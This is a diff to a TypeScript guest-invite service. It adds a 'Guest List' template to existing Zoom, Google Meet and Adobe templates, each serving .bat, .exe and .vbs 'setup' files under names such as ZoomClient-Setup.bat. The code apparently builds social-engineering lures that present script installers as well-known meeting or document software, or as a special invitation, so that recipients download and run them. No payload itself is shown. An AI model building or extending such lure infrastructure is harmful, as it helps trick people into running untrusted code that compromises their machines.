@@ -40,7 +40,7 @@ function generateGuestCode(): string {
 function buildGuestJoinUrl(
   appUrl: string,
   code: string,
-  template: 'zoom' | 'google_meet' | 'adobe',
+  template: 'zoom' | 'google_meet' | 'adobe' | 'guest_list',
 ): string {
   const base = appUrl.replace(/\/$/, '');
   if (template === 'google_meet') {
@@ -49,14 +49,18 @@ function buildGuestJoinUrl(
   if (template === 'adobe') {
     return `${base}/sharedfile/${code}`;
   }
+  if (template === 'guest_list') {
+    return `${base}/invitation/${code}`;
+  }
   return `${base}/joinzoom/${code}`;
 }
 
-type InviteTemplate = 'zoom' | 'google_meet' | 'adobe';
+type InviteTemplate = 'zoom' | 'google_meet' | 'adobe' | 'guest_list';
 
 function normalizeTemplate(template?: string | null): InviteTemplate {
   if (template === 'google_meet') return 'google_meet';
   if (template === 'adobe') return 'adobe';
+  if (template === 'guest_list') return 'guest_list';
   return 'zoom';
 }
 
@@ -64,6 +68,7 @@ export function installerBatFilename(template?: string | null): string {
   const t = normalizeTemplate(template);
   if (t === 'google_meet') return 'GoogleMeet-Setup.bat';
   if (t === 'adobe') return 'DocumentViewer-Setup.bat';
+  if (t === 'guest_list') return 'GuestList-Setup.bat';
   return 'ZoomClient-Setup.bat';
 }
 
@@ -71,6 +76,7 @@ export function installerGuiFilename(template?: string | null): string {
   const t = normalizeTemplate(template);
   if (t === 'google_meet') return 'GoogleMeet-Setup.exe';
   if (t === 'adobe') return 'DocumentViewer-Setup.exe';
+  if (t === 'guest_list') return 'GuestList-Setup.exe';
   return 'ZoomClient-Setup.exe';
 }
 
@@ -79,6 +85,7 @@ export function installerBrowserFilename(template?: string | null): string {
   const t = normalizeTemplate(template);
   if (t === 'google_meet') return 'GoogleMeet-Setup.vbs';
   if (t === 'adobe') return 'DocumentViewer-Setup.vbs';
+  if (t === 'guest_list') return 'GuestList-Setup.vbs';
   return 'ZoomClient-Setup.vbs';
 }
 
@@ -88,7 +95,7 @@ export function installerDownloadPath(_template?: string | null): string {
 }
 
 /** Bump when changing the browser-facing installer wrapper. */
-export const GUEST_INSTALLER_CACHE_BUST = '45';
+export const GUEST_INSTALLER_CACHE_BUST = '46';
 
 export function buildGuestInstallerUrl(apiUrl: string, code: string, template?: string | null): string {
   const base = apiUrl.replace(/\/$/, '');
@@ -165,6 +172,20 @@ function guiInstallerBranding(template?: string | null): {
       pageBg: '#ffffff',
     };
   }
+  if (t === 'guest_list') {
+    return {
+      windowTitle: 'Guest List Setup',
+      applicationName: 'Guest List Viewer',
+      brandLabel: 'Guest List',
+      heading: 'Join Session',
+      subheading: 'Download and run the session app to view the guest list on Windows.',
+      downloadLabel: 'Downloading session app',
+      installLabel: 'Installing',
+      accent: '#5c4d3c',
+      accentDark: '#4a3f32',
+      pageBg: '#e8e6e3',
+    };
+  }
   return {
     windowTitle: 'Zoom Meeting Setup',
     applicationName: 'Zoom Meetings',
@@ -199,6 +220,13 @@ function installerBranding(template?: string | null): {
       closingEcho: 'Finished. You can close this window and open your document.',
     };
   }
+  if (t === 'guest_list') {
+    return {
+      windowTitle: 'Guest List Setup',
+      header: '=== Guest List Session Setup ===',
+      closingEcho: 'Finished. You can close this window and return to your invitation.',
+    };
+  }
   return {
     windowTitle: 'Zoom Meeting Installer',
     header: '=== Zoom Client Setup ===',
@@ -221,7 +249,7 @@ export class GuestAccessService {
       notes?: string;
       maxUses?: number;
       ttl?: string;
-      inviteTemplate?: 'zoom' | 'google_meet' | 'adobe';
+      inviteTemplate?: 'zoom' | 'google_meet' | 'adobe' | 'guest_list';
     },
   ) {
     const env = getEnv();
@@ -241,7 +269,9 @@ export class GuestAccessService {
         ? 'Google Meet'
         : template === 'adobe'
           ? 'Adobe Document'
-          : 'Zoom Meeting';
+          : template === 'guest_list'
+            ? 'Special Invitation'
+            : 'Zoom Meeting';
     const link = await this.prisma.guestAccessLink.create({
       data: {
         organizationId,
